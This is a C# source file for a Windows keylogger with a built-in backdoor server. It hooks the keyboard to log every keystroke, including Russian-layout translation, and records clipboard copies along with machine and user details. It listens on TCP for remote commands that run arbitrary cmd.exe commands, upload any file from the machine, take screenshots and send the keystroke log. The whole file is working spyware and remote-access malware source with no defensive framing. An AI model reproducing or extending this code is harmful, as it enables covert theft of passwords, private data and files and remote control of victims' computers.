using System;
using System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using ConstantsLib;


//TODO
//1) chANGE layoutname to culture
//2) control + special symb
//3)encrypt
//4) when client disconnect without quit kill service routine task
namespace Server
{

    class Program
    {
        #region Dll Import
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        internal static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout(
            [In] int idThread
            );

        [DllImport("user32.dll")]
        private static extern long GetKeyboardLayoutName(StringBuilder pwszKLID);

        [DllImport("user32.dll")]
        public static extern int ActivateKeyboardLayout(int HKL, int flags);
        #endregion

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private readonly static LowLevelKeyboardProc hookProcedure = HookCallback;
        private static IntPtr hookPtr = IntPtr.Zero;

        static readonly Dictionary<char, char> ruEnDict = new Dictionary<char, char>();
        static private InputLanguage inputLanguage;

        [STAThread]
        static void Main(string[] args)
        {
            // Hide
            IntPtr winPtr = GetConsoleWindow();
            //ShowWindow(winPtr, Constants.SW_HIDE);
            File.Delete(Environment.CurrentDirectory + Constants.LogPath);//delete prev log for better debug


            FillDictionary();
            hookPtr = SetHook(hookProcedure);

            inputLanguage = InputLanguage.CurrentInputLanguage;
            LogEnvironmentAndUserStat();

            Thread serverThread = new Thread(ServerRoutine);
            serverThread.Start();
            Application.Run();//хукаем пока хукается

            UnhookWindowsHookEx(hookPtr);
        }

        private static void LogEnvironmentAndUserStat()
        {
            Log(String.Format(Constants.UnderscoreLine));
            Log(String.Format("CurrentDirectory: {0}\r\n", Environment.CurrentDirectory));
            Log(String.Format("MachineName: {0}\r\n", Environment.MachineName));
            Log(String.Format("OSVersion: {0}\r\n", Environment.OSVersion.ToString()));
            Log(String.Format("SystemDirectory: {0}\r\n", Environment.SystemDirectory));
            Log(String.Format("UserDomainName: {0}\r\n", Environment.UserDomainName));
            Log(String.Format("UserInteractive: {0}\r\n", Environment.UserInteractive));
            Log(String.Format("UserName: {0}\r\n", Environment.UserName));
            Log(String.Format("Clipboard: <**BEGIN**>{0}<**END**>\r\n", Clipboard.GetText(TextDataFormat.Text)));
            Log(String.Format("Installed languages:"));
            foreach (InputLanguage lang in InputLanguage.InstalledInputLanguages)
                Log(" " + lang.LayoutName);
            Log("\r\n");
            Log(String.Format("Layout: {0}\r\n", inputLanguage.LayoutName));
            Log(String.Format(Constants.UnderscoreLine));
        }
        
        public static void Screenshot()
        {
            // делаем скриншот
            Graphics graph = null;
            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            graph = Graphics.FromImage(bmp);
            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp.Save(Application.StartupPath + Constants.ScreenshotPath);
        }

        private static void FillDictionary()
        {
            string EnAlph = "~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:\"ZXCVBNM<>?`1234567890-=qwertyuiop[]\\asdfghjkl;'zxcvbnm,./↑←↓ ";
            string RuAlph = "Ё!\"№;%:?*()_+ЙЦУКЕНГШЩЗХЪ/ФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,ё1234567890-=йцукенгшщзхъ\\фывапролджэячсмитьбю.↑←↓ ";

            char[] En = EnAlph.ToCharArray();
            char[] Ru = RuAlph.ToCharArray();

            int a = En.Length;
            
            for (int i = 0; i < a; i++)
            {
                ruEnDict.Add(En[i], Ru[i]);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc llKeyboardProc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(Constants.WH_KEYBOARD_LL, llKeyboardProc,GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static void CorrectPresentation(ref string Presentation)
        {
            //correct non alphabetic/numerical symbols
            if (Presentation.Length > 1)
            {
                switch (Presentation)
                {
                    case ("Enter"):
                        Presentation = "\r\n";
                        break;
                    case ("Space"):
                        Presentation = " ";
                        break;
                    case ("OemPeriod"):
                        Presentation = ".";
                        break;
                    case ("Oemcomma"):
                        Presentation = ",";
                        break;
                    case ("Back"):
                        Presentation = "←";
                        break;
                    case ("Oem5"):
                        Presentation = "\\";
                        break;
                    case ("Divide"):
                        Presentation = "/";
                        break;
                    case ("CapsLock"):
                        Presentation = "{CAPSLOCK}";
                        break;
                    case ("Capital"):
                        Presentation = "{CAPSLOCK}";
                        break;
                    case ("Tab"):
                        Presentation = "{TAB}";
                        break;
                    case ("Oem1"):
                        Presentation = ";";
                        break;
                    case ("OemQuestion"):
                        Presentation = "?";
                        break;
                    case ("Назад"):
                        Presentation = "←";
                        break;
                    case ("OemSemicolon"):
                        Presentation = ";";
                        break;
                    case ("Oemtilde"):
                        Presentation = "~";
                        break;
                    case ("PrintScreen"):
                        Presentation = "{PrintScreen}";
                        break;
                    case ("Delete"):
                        Presentation = "←";
                        break;
                    case ("Alt"):
                        Presentation = "{ALT}";
                        break;
                    default:
                        Presentation = "";
                        break;
                }
            }
            else
            //translate    
            if (inputLanguage.LayoutName != Constants.USALang)
            {
                switch (inputLanguage.LayoutName)
                {
                    case (Constants.RuLang):
                        Presentation = ruEnDict[Presentation[0]].ToString();
                        break;
                    default:
                        break;
                }
            }
            Presentation = Presentation.ToLower();
            if (Control.ModifierKeys == Keys.Shift ^ Control.ModifierKeys == Keys.Capital)
                Presentation = Presentation.ToUpper();
        }
        
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if ((nCode >= 0)) // && ((wParam == (IntPtr)WM_KEYDOWN) || (wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                string vkCodePresentation = "";
                string logAddStr = "";
                Int32 vkCode = Marshal.ReadInt32(lParam + 0);

                //happens in both cases SYS+shift and shift+SYS
                if ((Control.ModifierKeys == (Keys.Alt | Keys.Shift))
                    || (Control.ModifierKeys == (Keys.Control | Keys.Shift)))
                {
                    ActivateKeyboardLayout(Constants.HKL_NEXT, 0);
                    inputLanguage = InputLanguage.CurrentInputLanguage;
                    Log("<Layout changhed: " + inputLanguage.LayoutName + ">");
                }else


                if (wParam == (IntPtr)Constants.WM_KEYDOWN)
                {
                    #region trash
                    //Int32 scanCode = Marshal.ReadInt32(lParam + sizeof(Int32
                    //string scanCodePresentation = kc.ConvertToString((Keys)scanCode);
                    //Console.Write("\n\nvk " + vkCodePresentation);

                    //InputLanguage CurrentInputLanguage = new InputLanguage();
                    //Console.WriteLine(InputLanguage.CurrentInputLanguage.LayoutName);

                    //if (!inputLanguage.Equals(CurrentInputLanguage))
                    //{
                    // inputLanguage = CurrentInputLanguage;
                    // Log("<Layout changhed: " + CurrentInputLanguage.LayoutName + ">");
                    // }
                    #endregion
                    
                    #region KeyCombinationHandle
                    if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        logAddStr = "<COPY: " + Clipboard.GetText(TextDataFormat.Text) + ">";
                    }
                    else if (Keys.V == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        logAddStr = "<PASTE>";
                    }
                    else if (Keys.Z == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        logAddStr = "<UNDO>";
                    }
                    else if (Keys.F == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        logAddStr = "<FIND>";
                    }
                    else if (Keys.A == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        logAddStr = "<ALL>";
                    }
                    else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        logAddStr = "<NEW>";
                    }
                    else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        logAddStr = "<NEW_TAB>";

                    }
                    else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        logAddStr = "<CUT>";
                    }
                    #endregion
                    else
                    {
                        KeysConverter keyConverter = new KeysConverter();
                        vkCodePresentation = keyConverter.ConvertToString((Keys)vkCode);
                        CorrectPresentation(ref vkCodePresentation);
                    }
                    
                }
                Log(vkCodePresentation + logAddStr);
            }

            return CallNextHookEx(hookPtr, nCode, wParam, lParam);  
        }

        public static void CreatProcessSendToClientOutputAndWaitTermination(string fileName, string processArgs, Socket client)
        {
            Process process = new Process();
            process.StartInfo.FileName = fileName;
            process.StartInfo.Arguments = processArgs;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.Verb = "runas";
            process.Start();

            StreamReader reader = process.StandardOutput;
            string output = reader.ReadToEnd();

            //SendReply(output, client);
            //SendReply("mock", client);

            process.WaitForExit();
            process.Close();
            if (string.IsNullOrEmpty(output))
                output = Constants.NoCmdProcessReply;
            SendReply(String.Format("{0}\nCommand process on server machine terminates.", output), client);
        }

        public static void SendReply(string reply, Socket client)
        {
            byte[] msg = Encoding.UTF8.GetBytes(reply);
            client.Send(msg);
        }

        public static void ServerRoutine()
        {
            IPEndPoint listenIPEndPoint = new IPEndPoint(IPAddress.Any, Constants.ListenPort);
            Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            listenSocket.Bind(listenIPEndPoint);
            listenSocket.Listen(10);
            Console.WriteLine("Waiting for a client...");

            while (true)
            {
                Socket clientSocket = listenSocket.Accept();
                try
                {
                    Task.Run(() => ServeOneClient(clientSocket));
                }
                catch (Exception ex)
                {
                    Console.Write(ex.Message);
                    SendReply(ex.Message, clientSocket);
                }
            }
        }

        public static void ServeOneClient(Socket clientSocket)
        {
            bool isServeEnd = false;
            string clientCmd = null;
            byte[] buf = new byte[1024];
            var splitChars = new[] { ' ' };
            string arguments = "";
            string[] argv;

            IPEndPoint clientEP = (IPEndPoint)clientSocket.RemoteEndPoint;
            Console.WriteLine("Connected with {0} at port {1}", clientEP.Address, clientEP.Port);
            while (!isServeEnd)
            {
                try
                {
                    int bytesReceived = clientSocket.Receive(buf);
                    clientCmd = Encoding.UTF8.GetString(buf, 0, bytesReceived);
                    Console.Write("Client cmd: " + clientCmd + "\n");
                    arguments = "";
                    argv = clientCmd.Split(splitChars, 2);
                    if (argv.Length > 1)
                        arguments = argv[1];

                    switch (argv[0])
                    {
                        case "help":
                            SendReply(Constants.HelpReply, clientSocket);
                            break;
                        case "quit":
                            SendReply("Keylogger closed.", clientSocket);
                            isServeEnd = true;
                            break;
                        case "cmd":
                            if (arguments.Length == 0)
                                throw new Exception("\nCmd needs arguments.");
                            CreatProcessSendToClientOutputAndWaitTermination("cmd.exe", "/C" + arguments, clientSocket); // /C Carries out the command specified by string and then terminates
                            break;
                        case "load":
                            if (arguments.Length == 0)
                                throw new Exception("\nLoad needs path.");
                            SendFile(arguments, clientSocket);
                            break;
                        case "screen":
                            Screenshot();
                            SendFile(Application.StartupPath + Constants.ScreenshotPath, clientSocket);
                            break;
                        case "log":
                            SendFile(Application.StartupPath + Constants.LogPath, clientSocket);
                            break;
                        default:
                            SendReply("Invalid cmd. Call HELP", clientSocket);
                            break;

                    }
                }
                catch (Exception ex)
                {
                    Console.Write(ex.Message);
                    SendAcknowledgement(Constants.ACK_ERROR, clientSocket);
                    SendReply(ex.Message, clientSocket);
                }
            }
            
        }

        public static void SendFile(string filePath, Socket client)
        {
            byte[] fileNameBytes = Encoding.ASCII.GetBytes(Path.GetFileName(filePath));
            byte[] fileNameLenBytes = BitConverter.GetBytes(fileNameBytes.Length);
            byte[] fileContent = File.ReadAllBytes(filePath);
            byte[] fileContentLen = BitConverter.GetBytes(fileContent.Length);
            byte[] sendBuf = new byte[fileContent.Length | (sizeof(int) + fileNameBytes.Length + sizeof(int))];//Marshal.SizeOf(filePath.Length)

            fileNameLenBytes.CopyTo(sendBuf, 0);
            fileNameBytes.CopyTo(sendBuf, sizeof(int));
            fileContentLen.CopyTo(sendBuf, sizeof(int) + fileNameBytes.Length);

            SendAcknowledgement(Constants.ACK_OK, client);
            client.Send(sendBuf, sizeof(int) + fileNameBytes.Length + sizeof(int), SocketFlags.None);
            if (GetAcknowlegment(client) == Constants.ACK_OK)
            {
                fileContent.CopyTo(sendBuf, 0);//отпрравляет сразу и служебную инфу и контент а клиент думает что это только служебная
                client.Send(sendBuf, fileContent.Length, SocketFlags.None);
                Console.WriteLine("File:{0} has been sent.", filePath);
            }
        }

        public static void SendAcknowledgement(int ACK, Socket socket)
        {
            socket.Send(BitConverter.GetBytes(ACK));
        }

        public static int GetAcknowlegment(Socket socket)
        {
            byte[] buf = new byte[sizeof(int)];
            socket.Receive(buf, sizeof(int), SocketFlags.None);
            return BitConverter.ToInt32(buf, 0);
        }

        public static void Log(string inputstring)
        {
            StreamWriter sw = new StreamWriter(Application.StartupPath + ConstantsLib.Constants.LogPath, true);
            sw.Write(inputstring);
            sw.Flush();
            sw.Close();
        }

        public static string Encrypt(string plainText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
        {
            return plainText;///

            if (string.IsNullOrEmpty(plainText))
                return "";

            byte[] initialVectorBytes = Encoding.ASCII.GetBytes(initialVector);
            byte[] saltValueBytes = Encoding.ASCII.GetBytes(salt);
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);

            PasswordDeriveBytes derivedPassword = new PasswordDeriveBytes
             (password, saltValueBytes, hashAlgorithm, passwordIterations);

            byte[] keyBytes = derivedPassword.GetBytes(keySize / 8);
            RijndaelManaged symmetricKey = new RijndaelManaged();
            symmetricKey.Mode = CipherMode.CBC;

            byte[] cipherTextBytes = null;

            using (ICryptoTransform encryptor = symmetricKey.CreateEncryptor
            (keyBytes, initialVectorBytes))
            {
                using (MemoryStream memStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream
                             (memStream, encryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                        cryptoStream.FlushFinalBlock();
                        cipherTextBytes = memStream.ToArray();
                        memStream.Close();
                        cryptoStream.Close();
                    }
                }
            }

            symmetricKey.Clear();
            return Convert.ToBase64String(cipherTextBytes);
        }

        static ushort GetKeyboardLayout()
        {
            #region trash
            ////Console.WriteLine("GetForegroundWindow()  = " + GetForegroundWindow());
            ////Console.WriteLine("GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero))  = " + GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
            //Console.WriteLine("GetKeyboardLayout  = " + GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero)));
            //const int KL_NAMELENGTH = 9;
            //var langCode = new StringBuilder(KL_NAMELENGTH);
            //GetKeyboardLayoutName(langCode);

            //Console.WriteLine("langCode.ToString()  = " + langCode.ToString());
            //return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
            #endregion
            //IntPtr layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
            //StringBuilder layout;
            //GetKeyboardLayoutName(Input);
            return 1; //Input
        }

    }
}
